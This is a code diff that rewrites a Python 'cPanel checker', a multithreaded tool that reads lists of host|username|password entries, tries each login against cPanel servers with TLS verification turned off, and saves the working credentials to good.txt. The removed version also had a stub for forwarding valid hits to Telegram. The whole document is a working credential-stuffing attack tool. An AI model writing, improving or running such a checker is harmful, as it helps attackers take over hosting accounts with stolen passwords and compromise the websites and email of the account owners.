@@ -1,73 +1,83 @@
+import re
 import sys
 import requests
 from multiprocessing.dummy import Pool as ThreadPool
+from requests.auth import HTTPBasicAuth
 from colorama import Fore, Style, init
 
 # Initialize colorama
 init(autoreset=True)
 
-# Define color constants
-G = Fore.GREEN
-R = Fore.RED
+# Colors
+fr = Fore.RED
+fc = Fore.CYAN
+fw = Fore.WHITE
+fg = Fore.GREEN
+fm = Fore.MAGENTA
 
-def send_text(text):
-    try:
-        # Replace this with your actual Telegram message sending logic
-        print(G + "Sending Message" + G)
-    except Exception as e:
-        print(R + f"Failed to send message: {e}")
+# Progress file
+progress_file = 'progress.txt'
 
-def check_account(account, total_accounts, index):
-    url, login, password = account.split('|')
-    headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
-        'Connection': 'keep-alive',
-        'Origin': url,
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
-        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"'
-    }
-    params = {'login_only': '1'}
-    data = {'user': login, 'pass': password}
+def report_progress(progress):
+    with open(progress_file, 'w') as f:
+        f.write(f"{progress}\n")
+
+def check_cpanel(site, total_sites, index):
+    data_cpanel = site.strip()
+
     try:
-        response = requests.post(f'{url}/login/', params=params, headers=headers, data=data, timeout=20, verify=False).json()
-        if response['status'] == 1:
-            print(f'{G}Valid: URL: {url} | Login: {login} | Password: {password}')
-            with open('good.txt', 'a') as f:
-                f.write(f'{url}|{login}|{password}\n')
-            send_text(f"{url}|{login}|{password}")
+        ip, username, password = site.split('|')
+        print(f" [*] Cpanel : {ip}")
+        print(f" [*] Username : {username}")
+        print(f" [*] Password : {password}")
+
+        session = requests.Session()
+        session.verify = False 
+        auth = HTTPBasicAuth(username, password)
+        response = session.get(ip, auth=auth)
+
+        if "email_accounts" in response.text:
+            print(f" {fg}[+] Login successful{Style.RESET_ALL}")
+            with open("good.txt", "a") as out:
+                out.write(f"{data_cpanel}\n")
         else:
-            print(f'{R}Invalid: URL: {url} | Login: {login} | Password: {password}')
+            print(f" {fr}[-] Login Failed {Style.RESET_ALL}")
+
+    except ValueError:
+        print(f" {fr} [-] Login Failed: Invalid format {Style.RESET_ALL}")
+
     except Exception as e:
-        print(f"{R}Error: {e} for URL: {url}")
+        print(f" {fr} [-] Login Failed: {e} {Style.RESET_ALL}")
+
+    finally:
+        progress = int((index / total_sites) * 100)
+        report_progress(progress)
 
 def main(filename, thread_count):
     try:
         with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
-            accounts = file.read().splitlines()
-        total_accounts = len(accounts)
+            sites = file.read().splitlines()
+        
+        total_sites = len(sites)
         pool = ThreadPool(thread_count)
-        for i, account in enumerate(accounts):
-            pool.apply_async(check_account, args=(account, total_accounts, i + 1))
+        
+        for i, site in enumerate(sites):
+            pool.apply_async(check_cpanel, args=(site, total_sites, i + 1))
+        
         pool.close()
         pool.join()
     except FileNotFoundError:
-        print(f'File {filename} not found.')
+        print(f'{fr}[ERROR]{Style.RESET_ALL} File {filename} tidak ditemukan.')
     except ValueError:
-        print('Please enter a valid number of threads.')
+        print('Masukkan jumlah thread yang valid.')
     except Exception as e:
-        print(f'Error: {e}')
+        print(f'Terjadi kesalahan: {e}')
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
-        print("Usage: python cp.py <filename> <thread_count>")
+        print("Usage: python cpanel_checker.py <filename> <thread_count>")
     else:
         filename = sys.argv[1]
         thread_count = int(sys.argv[2])
-        print(f"Running cp.py with file: {filename} and threads: {thread_count}")
+        print(f"Running cpanel_checker.py with file: {filename} and threads: {thread_count}")
         main(filename, thread_count)
